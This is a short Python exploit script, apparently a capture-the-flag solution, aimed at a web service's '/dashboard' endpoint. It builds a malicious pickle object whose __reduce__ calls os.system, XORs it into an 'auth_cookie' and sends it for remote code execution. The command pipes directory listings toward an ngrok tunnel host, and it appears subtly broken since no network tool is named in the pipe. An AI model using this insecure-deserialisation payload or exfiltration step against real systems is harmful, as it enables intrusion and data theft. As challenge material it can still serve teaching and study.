import requests
import pickle
from pwn import *
url = "http://35.198.93.134:30049/dashboard"
class RCE:
    def __reduce__(self):
        cmd = ('ls -lah | 0.tcp.eu.ngrok.io 19130')
        return os.system, (cmd,)

payload = pickle.dumps(RCE(), protocol=2)
print(payload)
key = len(payload) * "A"
auth_cookie = xor(payload, key).hex()
r = requests.get(url, cookies={"key": key, "auth_cookie": auth_cookie})